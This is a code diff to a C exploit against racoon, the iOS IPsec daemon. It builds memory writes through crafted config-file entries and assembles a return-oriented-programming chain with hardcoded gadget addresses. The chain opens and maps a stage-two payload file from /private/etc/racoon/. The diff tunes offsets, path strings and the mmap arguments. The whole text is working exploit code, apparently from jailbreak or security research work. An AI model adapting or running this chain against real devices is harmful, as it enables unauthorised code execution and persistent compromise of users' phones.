@@ -38,7 +38,7 @@ struct offset_struct {
 	uint64_t stage2_size;
 };
 typedef struct offset_struct offset_struct_t;
-#define STAGE2_FD 3
+#define STAGE2_FD 6
 #define RACOON_YY_BUF_SIZE 16384
 #define BYTES_PER_WRITE 400 // approx amount of bytes we need for one 64-bit write FIXME: this can be prob way lower than 400
 
@@ -128,9 +128,8 @@ void write_to_lcconf(uint32_t what) {
 	// if we only want a 32 bit write we should get one and don't zero out the other 32 bits
 	// this is an improvment from the script where we used padding and maximum_length to only write 32 bits each iteration
 	// IDK if this works like it should... FIXME: there is a chance that we acc want to write 64 bit with the upper once being zero
-	if (higher != 0) {
-		snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);
-	}
+	// Commted out for now if (higher != 0) {
+	snprintf((char*)(((uint64_t)buf)+strlen(buf)),sizeof(buf)-strlen(buf)-1, "interval%usec;",higher);
 
 	strcat(buf,"}"); // close the padding statment
 	total_bytes_written += strlen(buf);
@@ -222,6 +221,13 @@ void stage1(int fd, offset_struct_t * offsets) {
 		uint64_t slide = i*offsets->slide_value;
 		//www64(fd,offsets,0x4141414141,offsets->memmove+slide);
 		www64(fd,offsets,offsets->memmove+slide,offsets->pivot_x21+slide);
+		
+		char stage2_file_name[8];
+		snprintf((void*)&stage2_file_name,8,"%07d",i);
+		uint64_t stage2_file_name_int;
+		memcpy(&stage2_file_name_int,&stage2_file_name,8);
+		www64(fd,offsets,ropchain_addr+0xd0,stage2_file_name_int);
+
 		rop_gadget_t * curr_gadget = offsets->stage1_ropchain;
 		uint64_t curr_ropchain_addr = ropchain_addr;
 		while (curr_gadget != NULL) {
@@ -287,7 +293,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.pivot_x21 = 0x1990198fc;
 	myoffsets.str_buff_offset = 8;
 	myoffsets.BEAST_GADGET = 0x1a0478c70;
-	myoffsets.stage2_base = 0x420000000;
+	myoffsets.stage2_base = 0x200000000;
 	myoffsets.stage2_size = 0x1000;
 
 
@@ -359,7 +365,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 		0x1a0478cb4      c0035fd6       ret
 
 		We will call open("/private/etc/racoon/<func pointer>", O_RDONLY); the func pointer will be used to know which slide we need to use
-		Path is stored at 0xc4, we can do this because we assume that the stage2 baseaddress will always have a zero byte
+		Path is stored at 0xb8, we can do this because we assume that the stage2 baseaddress will always have a zero byte
 
 		This means we need to load the address of the path into x26 at [1], x27 will contain the open func pointer and x25 O_RDONLY
 
@@ -391,7 +397,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0x20		[2] x23 [3] x3/fourth arg
 	ADD_GADGET();							   // 0x28		[2] x24 [3] x2/third arg
 	ADD_STATIC_GADGET(O_RDONLY);			   // 0x30		[2] x25 [3] x1/second arg
-	ADD_OFFSET_GADGET(0xc4);				   // 0x38		[2] x26 [3] x0/first arg
+	ADD_OFFSET_GADGET(0xb8);				   // 0x38		[2] x26 [3] x0/first arg
 	ADD_CODE_GADGET(myoffsets.open);		   // 0x40		[2] x27 [3] call gadget
 	ADD_GADGET();							   // 0x48		[2] x28 
 	ADD_CODE_GADGET(myoffsets.longjmp);		   // 0x50		[1] (next gadget) [2] 0x29 (but x29 will be overwritten later)
@@ -408,18 +414,18 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	ADD_GADGET();							   // 0xa8		[2] weird Dx registers
 
 	ADD_GADGET();							   // 0xb0		[2] new stack top 
-	ADD_GADGET();							   // 0xb8
-	ADD_STATIC_GADGET(0x6972702f00000000);	   // 0xc0		[3] d9		      (/pri)
-	ADD_STATIC_GADGET(0x6374652f65746176);	   // 0xc8		[3] d8            (vate/etc)
-	ADD_STATIC_GADGET(0x2f6e6f6f6361722f);	   // 0xd0		[3] x28           (/racoon/)
+	ADD_STATIC_GADGET(0x657461766972702f);	   // 0xb8		    		       (/private)
+	ADD_STATIC_GADGET(0x6361722f6374652f);	   // 0xc0		[3] d9             (/etc/rac)				 
+	ADD_STATIC_GADGET(0x2f6f77742f6e6f6f);	   // 0xc8		[3] d8             (oon/two/)
+	ADD_STATIC_GADGET(0x0);					   // 0xd0		[3] x28           
 	ADD_CODE_GADGET(myoffsets.mmap);		   // 0xd8		[3] x27 [4] call gadget
 	ADD_STATIC_GADGET(myoffsets.stage2_base);  // 0xe0		[3] x26 [4] x0/first arg
 	ADD_STATIC_GADGET(myoffsets.stage2_size);  // 0xe8		[3] x25 [4] x1/second arg
 	ADD_STATIC_GADGET(PROT_READ | PROT_WRITE); // 0xf0		[3] x24 [4] x2/third arg
 	ADD_STATIC_GADGET(MAP_FIXED | MAP_PRIVATE) // 0xf8		[3] x23 [4] x3/fourth arg
 	ADD_STATIC_GADGET(STAGE2_FD);			   // 0x100		[3] x22 [4] x4/fifth arg
-	ADD_STATIC_GADGET(0);					   // 0x108		[3] x21 [4] x5/sixth arg
-	ADD_GADGET();							   // 0x110		[3] x20 [4] x6/seventh arg
+	ADD_GADGET();							   // 0x108		[3] x21 [4] x6/seventh arg
+	ADD_STATIC_GADGET(0);					   // 0x110		[3] x20 [4] x5/sixth arg
 	ADD_GADGET();							   // 0x118		[3] x19 [4] x7/eighth arg
 	ADD_GADGET();							   // 0x120		[3] x29
 	ADD_CODE_GADGET(myoffsets.BEAST_GADGET);   // 0x128		[3] x30 (next gadget)
